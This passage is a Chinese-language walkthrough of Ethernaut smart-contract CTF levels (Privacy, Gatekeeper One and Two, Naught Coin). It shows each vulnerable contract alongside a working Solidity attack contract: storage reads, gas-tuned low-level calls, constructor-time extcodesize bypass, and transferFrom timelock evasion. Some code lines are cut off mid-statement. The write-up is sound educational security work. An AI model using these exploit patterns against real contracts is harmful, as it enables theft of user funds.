        require(_key == bytes16(data[2]));
        locked = false;
      }
      /*
        A bunch of super advanced solidity algorithms...
          ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
          .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
          *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V
          `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
          ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
      */
    }
之前 `Vault` 题目的升级版。还是一样，用 `getStorageAt()` 把链上的数据读出来先。
    web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)});
    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
    web3.eth.getStorageAt(contract.address, 2, function(x, y) {alert(y)});
    web3.eth.getStorageAt(contract.address, 3, function(x, y) {alert(y)});
    web3.eth.getStorageAt(contract.address, 4, function(x, y) {alert(y)});
    // 0x00000000000000000000000000000000000000000000000000000086b2ff0a01
    // 0x6be9a25967a00434c9634d02b673c5bb4a14ad1fe8f1439e41f7f926dc3a884a
    // 0xcf1e2bfa2471a6cfa8edd2cab4140248f94ca74b87691f129444677be4bd9c88
    // 0x06b3b79c6b707e890d7160ed7a1c16df8a16704fdd0bafcbc08e3094ab05dd40
    // 0x0000000000000000000000000000000000000000000000000000000000000000
可以看到，每一个存储位是 32 个字节。根据 Solidity 优化规则，当变量所占空间小于 32
字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。  
除去 `ID` 常量无需存储
  * `bool public locked = true` 占 1 字节 -> `01`
  * `uint8 private flattening = 10` 占 1 字节 -> `0a`
  * `uint8 private denomination = 255` 占 1 字节 -> `ff`
  * `uint16 private awkwardness = uint16(now)` 占 2 字节 -> `86b2`
刚好对应了第一个存储位的 `86b2ff0a01`
解题需要的 `data[2]` 则应该在第四存储位
`0x06b3b79c6b707e890d7160ed7a1c16df8a16704fdd0bafcbc08e3094ab05dd40`
注意到这里有一个 `bytes32` 转换为 `bytes16`，在 Remix-ide 上做一个简单测试。
所以只需要取前 16 字节即可
## 13\. Gatekeeper One
    pragma solidity ^0.4.18;
    contract GatekeeperOne {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        require(msg.gas % 8191 == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
需要满足 3 个 modifier 的条件。
`gateOne()` 利用之前做过的 Telephone 的知识，从第三方合约来调用 `enter()` 即可满足条件。
`gateTwo()` 需要满足 `msg.gas % 8191 == 0`  
`msg.gas` 文档里的描述是 `remaining gas`，在 Javascript VM 环境下进行 Debug，在 Step detail
栏中可以看到这个变量。
同时，在调用 `enter()` 函数的时候，可以选择更加底层的 `call` 来更方便控制传递的 gas 数量。通过 debug 找到一个符合要求的
gas 数量 41170。
`gateThree()` 也比较简单，将 `tx.origin` 倒数三四字节换成 0000 即可。  
`bytes8(tx.origin) & 0xFFFFFFFF0000FFFF` 即可满足条件。
部署合约
    pragma solidity ^0.4.18;
    contract GatekeeperOne {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        require(msg.gas % 8191 == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
    contract Attack {
        address instance_address = instance_address_here;
        bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
        GatekeeperOne target = GatekeeperOne(instance_address);
        function hack() public {
            target.call.gas(41170)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        }
    }
调用 `hack()` 函数，完成攻击。
## 14\. Gatekeeper Two
    pragma solidity ^0.4.18;
    contract GatekeeperTwo {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
`gateOne()` 和上一题一样，用第三方合约来调用 `enter()` 即可满足条件。
`gateThree()` 也比较简单，由于是个异或，可以直接算出来。  
`_gateKey = (bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1))`
比较有技巧性的是 `gateTwo()` ，用了内联汇编的写法。  
翻了一下文档 
  * `caller` : `Get caller address.`
  * `extcodesize` : `Get size of an account’s code.`
按照题目的意思，要使当前合约代码区为空，显然与解题是矛盾的。
仔细读文档，注意到一些细节
> Note that while the initialisation code is executing, the newly created
> address exists but with no intrinsic body code.  
>  ……  
>  During initialization code execution, EXTCODESIZE on the address should
> return zero, which is the length of the code of the account while CODESIZE
> should return the length of the initialization code.
也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 `EXTCODESIZE()` 返回为
0
那么，只需要在第三方合约的构造函数中来调用题目合约中的 `enter()` 即可满足条件。
    pragma solidity ^0.4.18;
    contract GatekeeperTwo {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
    contract Attack {
        address instance_address = instance_address_here;
        GatekeeperTwo target = GatekeeperTwo(instance_address);
        function Attack(){
            target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1)));
        }
    }
部署合约，自动调用构造函数的 `target.enter()`，完成攻击。
## 15\. Naught Coin
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
     contract NaughtCoin is StandardToken {
      string public constant name = 'NaughtCoin';
      string public constant symbol = '0x0';
      uint public constant decimals = 18;
      uint public timeLock = now + 10 years;
      uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
      address public player;
      function NaughtCoin(address _player) public {
        player = _player;
        totalSupply_ = INITIAL_SUPPLY;
        balances[player] = INITIAL_SUPPLY;
        Transfer(0x0, player, INITIAL_SUPPLY);
      }
      function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
        super.transfer(_to, _value);
      }
      // Prevent the initial owner from transferring tokens until the timelock has passed
      modifier lockTokens() {
        if (msg.sender == player) {
          require(now > timeLock);
          if (now   
在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上
在接口规范里能看到，除了 `transfer()` 之外，还有 `transferFrom()` 函数也可以进行转账操作。
由于 NaughtCoin 子合约中并没有实现该接口，我们可以直接调用，从而绕开了 `lockTokens()` ，题目的突破口就在此。  
需要注意的是，与 `transfer()` 不同，调用 `transferFrom()` 需要 `msg.sender` 获得授权。由于我们本就是合约的
owner，可以自己给自己授权。授权操作在接口文档里也有
    function approve(address _spender, uint256 _value) returns (bool success)
还有一点，转账的目标账户不能是非法地址，所以需要部署一个第三方 NaughtCoin 合约。注意 import 的时候地址是 github 链接。
    pragma solidity ^0.4.18;
    import 'https://github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
    contract NaughtCoin is StandardToken {
        string public constant name = 'NaughtCoin';
        string public constant symbol = '0x0';
        uint public constant decimals = 18;
        uint public timeLock = now + 10 years;
        uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
        address public player;
        function NaughtCoin(address _player) public {
            player = _player;
            totalSupply_ = INITIAL_SUPPLY;
            balances[player] = INITIAL_SUPPLY;
            Transfer(0x0, player, INITIAL_SUPPLY);
        }
        function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
            super.transfer(_to, _value);
        }
        // Prevent the initial owner from transferring tokens until the timelock has passed
        modifier lockTokens() {
            if (msg.sender == player) {
                require(now > timeLock);
                if (now  When using code that’s not your own, it’s a good idea to familiarize
> yourself with it to get a good understanding of how everything fits
> together. This can be particularly important when there are multiple levels
> of imports (your imports have imports) or when you are implementing
> authorization controls, e.g. when you’re allowing or disallowing people from
> doing things. In this example, a developer might scan through the code and
> think that transfer is the only way to move tokens around, low and behold
> there are other ways of performing the same operation with a different
> implementation.
## References
## 写在最后
如果文章里出现了一些错误，接受大家的批评与指正。  
也欢迎同样感兴趣的朋友与我交流联系。
审核人：yiwang 编辑：边边